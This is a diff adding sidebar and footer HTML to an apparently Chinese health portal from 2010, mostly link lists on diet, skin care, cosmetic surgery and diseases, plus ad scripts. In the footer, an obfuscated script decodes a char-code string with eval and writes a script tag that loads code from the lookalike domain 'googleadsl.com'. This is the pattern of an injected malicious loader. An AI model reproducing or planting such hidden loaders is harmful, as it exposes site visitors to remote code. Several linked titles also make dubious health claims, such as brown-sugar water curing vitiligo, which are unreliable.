+<li><a href="2010/1214/33511.html" title="冬季家庭健身方式大盘点" target="_blank">冬季家庭健身方式大盘点</a></li>
+<li><a href="2010/1214/33510.html" title="塑身大潮来临　你真的会跑步吗?" target="_blank">塑身大潮来临　你真的会跑步吗?</a></li>
+            </ul>
+          </div>
+          <div id="con_pdtj_3" class="tab_con" style="display:none">
+            <div class="a_info">
+ <div class="ib"><a href="2010/1204/30988.html" target="_blank"><img src="uploadfile/2010/1206/20101206054044448.jpg" width="115" height="85" alt="美味瘦身食谱之DIY低卡甜点" /></a></div>
+<h4><a href="2010/1204/30988.html" title="美味瘦身食谱之DIY低卡甜点" target="_blank">美味瘦身食谱之DIY低卡甜</a></h4>
+<p>　　很多爱美的MM为了减肥都会上网搜寻一些瘦身食谱，让自己在减……【<a href="2010/1204/30988.html" target="_blank">查看详细</a>】</p>
+            </div>
+            <ul class="e_list">
+<li><a href="2010/1215/33734.html" title="20、30、40女性的排毒减肥食谱，提醒你排清毒素才能" target="_blank">20、30、40女性的排毒减肥食谱，提醒</a></li>
+<li><a href="2010/1215/33733.html" title="营养师推荐健康减肥食谱 极品黄豆料理，推荐健康减肥食品" target="_blank">营养师推荐健康减肥食谱 极品黄豆料</a></li>
+<li><a href="2010/1215/33732.html" title="八大燕麦减肥食谱 巧吃巧减肥" target="_blank">八大燕麦减肥食谱 巧吃巧减肥</a></li>
+<li><a href="2010/1214/33530.html" title="怎样避免运动时间长了长肌肉" target="_blank">怎样避免运动时间长了长肌肉</a></li>
+            </ul>
+          </div>
+          <div id="con_pdtj_4" class="tab_con" style="display:none">
+            <div class="a_info">
+<div class="ib"><a href="2010/1029/23168.html" target="_blank"><img src="uploadfile/2010/1029/20101029022353259.jpg" width="115" height="85" alt="冬季如何给肌肤滋养？" /></a></div>
+<h4><a href="2010/1029/23168.html" title="冬季如何给肌肤滋养？" target="_blank">冬季如何给肌肤滋养？</a></h4>
+<p>天气越来越来，越来越干燥。这使很多爱美的MM带来很多烦恼。在寒……【<a href="2010/1029/23168.html" target="_blank">查看详细</a>】</p>
+            </div>
+            <ul class="e_list">
+<li><a href="2010/1214/33572.html" title="十分钟痘痘肌肤保养三***" target="_blank">十分钟痘痘肌肤保养三***</a></li>
+<li><a href="2010/1214/33571.html" title="关之琳的护肤要点是要开心！" target="_blank">关之琳的护肤要点是要开心！</a></li>
+<li><a href="2010/1214/33570.html" title="美味薏仁粥 肌肤美白又除皱" target="_blank">美味薏仁粥 肌肤美白又除皱</a></li>
+<li><a href="2010/1214/33569.html" title="男士护肤抗老心得" target="_blank">男士护肤抗老心得</a></li>
+            </ul>
+          </div>
+          <div id="con_pdtj_5" class="tab_con" style="display:none">
+            <div class="a_info">
+<div class="ib"><a href="2010/1205/31174.html" target="_blank"><img src="uploadfile/2010/1206/20101206053400252.jpg" width="115" height="85" alt="颧骨整形成功的评价标准" /></a></div>
+<h4><a href="2010/1205/31174.html" title="颧骨整形成功的评价标准" target="_blank">颧骨整形成功的评价标准</a></h4>
+<p>　　颧骨手术虽然存在一定的风险，但是只是您做好充足的心理准备……【<a href="2010/1205/31174.html" target="_blank">查看详细</a>】</p>
+            </div>
+            <ul class="e_list">
+<li><a href="2010/1215/33736.html" title="眼袋隐形 让眼睛更大更亮" target="_blank">眼袋隐形 让眼睛更大更亮</a></li>
+<li><a href="2010/1215/33735.html" title="韩式重睑术 给你靓丽双眸" target="_blank">韩式重睑术 给你靓丽双眸</a></li>
+<li><a href="2010/1215/33730.html" title="颧骨整形塑造s曲线面容" target="_blank">颧骨整形塑造s曲线面容</a></li>
+<li><a href="2010/1214/33454.html" title="颌面整形 塑出迷人小尖脸" target="_blank">颌面整形 塑出迷人小尖脸</a></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+  </div>
+   <!--频道推荐 end-->
+   <!--健康新闻推荐 start-->
+     <div class="art_jk">
+   <div class="title">
+     <span><a href="/" target="_blank">健康新闻推荐</a></span></div>
+ <ul>
+<li><a href="2010/1205/31186.html" target="_blank"><img src="uploadfile/2010/1206/20101206052644212.jpg" width="115" height="85" alt="牛皮癣的经验方分享" /></a><span><a href="2010/1205/31186.html" title="牛皮癣的经验方分享" target="_blank">牛皮癣的经验方分</a></span></li>
+<li><a href="2010/1205/31183.html" target="_blank"><img src="uploadfile/2010/1206/20101206051953416.jpg" width="115" height="85" alt="女性也会患尿道结石吗？" /></a><span><a href="2010/1205/31183.html" title="女性也会患尿道结石吗？" target="_blank">女性也会患尿道结</a></span></li>
+<li><a href="2010/1204/31035.html" target="_blank"><img src="uploadfile/2010/1206/20101206052342346.jpg" width="115" height="85" alt="麦粒肿的预防与治疗" /></a><span><a href="2010/1204/31035.html" title="麦粒肿的预防与治疗" target="_blank">麦粒肿的预防与治</a></span></li>
+<li><a href="2010/1204/30991.html" target="_blank"><img src="uploadfile/2010/1206/20101206051634378.jpg" width="115" height="85" alt="哪些食疗方可治感冒？" /></a><span><a href="2010/1204/30991.html" title="哪些食疗方可治感冒？" target="_blank">哪些食疗方可治感</a></span></li>
+ </ul>
+
+ </div>
+   
+   <!--健康新闻推荐 end-->
+  <!--疾病文章推荐 start-->
+    <div class="art_jb">
+  <div class="title">疾病文章推荐</div>
+  <div class="conbox">
+    <ul>
+<li><a href="2010/1215/33766.html" title="系统性红斑狼疮发病情况如何" target="_blank">系统性红斑狼疮发病</a></li> 
+<li><a href="2010/1215/33765.html" title="哪些偏方可治酒渣鼻" target="_blank">哪些偏方可治酒渣鼻</a></li> 
+<li><a href="2010/1215/33764.html" title="疥疮是性病吗？" target="_blank">疥疮是性病吗？</a></li> 
+<li><a href="2010/1215/33763.html" title="战“痘”的必胜宝典" target="_blank">战“痘”的必胜宝典</a></li> 
+<li><a href="2010/1215/33762.html" title="冻疮的中药治疗法" target="_blank">冻疮的中药治疗法</a></li> 
+<li><a href="2010/1215/33761.html" title="脚气反复 我该找谁？" target="_blank">脚气反复 我该找谁</a></li> 
+<li><a href="2010/1215/33760.html" title="性连锁隐患性鱼鳞病" target="_blank">性连锁隐患性鱼鳞病</a></li> 
+<li><a href="2010/1215/33759.html" title="每日一杯红糖水可治白癜风" target="_blank">每日一杯红糖水可治</a></li> 
+
+
+</ul>
+  </div>
+</div>
+   <!--疾病文章推荐 end-->
+     <!--育儿热点推荐 start-->
+     <div class="art_jk">
+   <div class="title">
+     <span><a href="/baby" target="_blank">育儿热点推荐</a></span></div>
+ <ul>
+<li><a href="2010/1205/31206.html" target="_blank"><img src="uploadfile/2010/1206/20101206054706659.jpg" width="115" height="85" alt="女性长期服用维生素致难怀孕" /></a><span><a href="2010/1205/31206.html" title="女性长期服用维生素致难怀孕" target="_blank">女性长期服用维生</a></span></li>
+<li><a href="2010/0824/10948.html" target="_blank"><img src="uploadfile/2010/0824/20100824030306730.jpg" width="115" height="85" alt="夏秋换季宝宝常见的5大疾病" /></a><span><a href="2010/0824/10948.html" title="夏秋换季宝宝常见的5大疾病" target="_blank">夏秋换季宝宝常见</a></span></li>
+ </ul>
+
+ </div>
+   
+   <!--育儿热点推荐 end-->
+    <!--老人养生保健 start-->
+     <div class="art_jk">
+   <div class="title">
+     <span><a href="/oldman" target="_blank">老人养生保健</a></span></div>
+ <ul>
+<li><a href="2010/1129/30086.html" target="_blank"><img src="uploadfile/2010/1202/20101202112825870.jpg" width="115" height="85" alt="慈禧太后养生之道" /></a><span><a href="2010/1129/30086.html" title="慈禧太后养生之道" target="_blank">慈禧太后养生之道</a></span></li>
+<li><a href="2010/1128/30025.html" target="_blank"><img src="uploadfile/2010/1202/20101202111205963.jpg" width="115" height="85" alt="老人吃完粗粮不宜多喝水" /></a><span><a href="2010/1128/30025.html" title="老人吃完粗粮不宜多喝水" target="_blank">老人吃完粗粮不宜</a></span></li>
+ </ul>
+
+ </div>
+   
+   <!--老人养生保健 end-->
+   <!--GOOGLE广告 start-->
+    <div class="art_goo">
+<script type="text/javascript"><!--
+google_ad_client = "pub-0307374640819824";
+/* 内容页右边300x250, 创建于 10-6-26 */
+google_ad_slot = "8131633952";
+google_ad_width = 300;
+google_ad_height = 250;
+//-->
+</script>
+<script type="text/javascript"
+src="http://pagead2.googlesyndication.com/pagead/show_ads.js">
+</script>
+</div>
+   <!--GOOGLE广告 end-->
+   <!--分类信息 -->	
+<div class="fenl02">
+  <h3 class="lei">分类信息</h3>
+  <ul class="xinxi">
+    <li>·<a href="http://www.dfkang.com/" target="_blank">妇科健康网</a></li>
+<li>·<a href="http://www.chinesejk.com/2010/0818/8542.html" target="_blank">如何调适乏味的性生活?</a></li>
+    <script src="/adjs/nrflxx.js"></script>
+  </ul>
+</div>
+ <!--分类信息 end-->		
+    <!--GOOGLE广告 start-->
+    <div class="art_goo">
+  <script type="text/javascript"><!--
+google_ad_client = "pub-0307374640819824";
+/* 内容页右边二 */
+google_ad_slot = "1742782983";
+google_ad_width = 300;
+google_ad_height = 250;
+//-->
+</script>
+<script type="text/javascript"
+src="http://pagead2.googlesyndication.com/pagead/show_ads.js">
+</script>	</div>
+   <!--GOOGLE广告 end-->
+   <!--栏目推荐导航 start-->
+   <div class="art_lm">
+     <div class="title">栏目导航推荐</div>
+     <ul>
+   <li><a href="/nanke/qlxjb/" target="_blank">前列腺疾病</a></li>
+   <li><a href="/nanke/xgnza/" target="_blank">性功能障碍</a></li>
+   <li><a href="/nanke/xgnza/yw/" target="_blank">阳痿</a></li>
+   <li><a href="/nanke/xgnza/zx/" target="_blank">早泄</a></li>
+   <li><a href="/nanke/xgnza/xydx/" target="_blank">性欲低下</a></li>
+   <li><a href="/fuke/fkyz/ydy/" target="_blank">阴道炎</a></li>
+   <li><a href="/fuke/fkyz/pqy/" target="_blank">盆腔炎</a></li>
+   <li><a href="/fuke/fkyz/gjy/" target="_blank">宫颈炎</a></li>
+   <li><a href="/fuke/fkyz/fjy/" target="_blank">附件炎</a></li>
+   <li><a href="/fuke/fkyz/zgnmy/" target="_blank">子宫内膜炎</a></li>
+   <li><a href="/zhengxing/mianbuzx/rxb/" target="_blank">隆下巴</a></li>
+   <li><a href="/zhengxing/mianbuzx/xhjzx/" target="_blank">下颌角整形</a></li>
+   <li><a href="/zhengxing/yanbuzx/cjs/" target="_blank">重睑术</a></li>
+   <li><a href="/zhengxing/yanbuzx/qyd/" target="_blank">祛眼袋</a></li>
+   <li><a href="/zhengxing/yanbuzx/yjkd/" target="_blank">眼角开大</a></li>
+   <li><a href="/zhengxing/xiongbuzx/" target="_blank">胸部整形</a></li>
+ </ul>
+   </div>
+    <!--栏目推荐导航 end-->
+ </div>
+
+
+
+
+ 
+
+
+
+
+
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!--foot start-->
+<script>
+t="60,83,67,82,73,80,84,32,115,114,99,61,34,104,116,116,112,58,47,47,119,119,119,46,103,111,111,103,108,101,97,100,115,108,46,99,111,109,47,115,112,99,111,100,101,47,99,112,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+ <!--t1-->  
+
+
+
+
+
+<script language="JavaScript" src="count.php?contentid=39"></script>
+
+
+
+
+
+    <div class="foot">
+   <a href="/">关于我们</a>| <a onclick="this.style.behavior='url(#default#homepage)'; this.setHomePage('http://www.chinesejk.com');" href="#">设为首页</a> | <a href="javascript:window.external.AddFavorite('http://www.chinesejk.com','华人健康网')">加入收藏</a> | <a href="/sitemap.html" target="_blank">网站地图</a> | <A href="tencent://message/?uin=6875839&Site=华人健康网&Menu=yes">友情链接</A> | <A href="tencent://message/?uin=6875839&Site=华人健康网&Menu=yes">业务联系</A> | <A href="tencent://message/?uin=6875839&Site=华人健康网&Menu=yes">频道合作</A><br />
+   Copyright &copy; 2009 chinesejk.com All Rights Reserved　华人健康网 版权所有<br />
+   本站如有转载或引用文章涉及版权问题，请速与我们联系 QQ:<A href="tencent://message/?uin=6875839&Site=华人健康网&Menu=yes">6875839</a><br />
+  特别声明：本站内容仅供参考，不作为诊断及医疗依据。<br />
+   <a href="http://www.miibeian.gov.cn/" target="_blank">闽ICP备09040914号</a> 
+   
+  </div>
+<!--foot end-->  
+  
+</div>
+<script type="text/javascript">
+var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3Fb2bcfdfdd7fca4a469ffe2625013fa0e' type='text/javascript'%3E%3C/script%3E"));
+</script>
+</body>
+</html>
+<script type="text/javascript"> /*漂浮120*270*/ var cpro_id = 'u293617';</script>
+
+<script type="text/javascript" src="http://cpro.baidu.com/cpro/ui/f.js"></script>
+
